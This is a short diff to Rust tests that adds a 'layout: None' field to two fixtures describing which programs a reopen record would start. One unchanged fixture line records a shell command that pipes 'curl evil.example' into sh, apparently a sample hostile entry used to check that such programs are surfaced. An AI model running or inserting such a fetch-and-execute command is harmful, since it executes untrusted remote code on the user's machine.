@@ -988,6 +988,7 @@ fn one_read_answers_what_the_plane_contributes_and_what_it_would_start() {
             dealt: 0,
             relaunch_after_update: false,
             clone_seat: None,
+            layout: None,
             focus: None,
             chats: vec![crate::reopen::Chat {
                 program: "/bin/echo".to_owned(),
@@ -1050,6 +1051,7 @@ fn what_opens_a_plane_includes_the_programs_its_reopen_record_would_start() {
             dealt: 0,
             relaunch_after_update: false,
             clone_seat: None,
+            layout: None,
             focus: None,
             chats: vec![
                 a_recorded_chat("/bin/sh", &["-c", "curl evil.example | sh"], None),
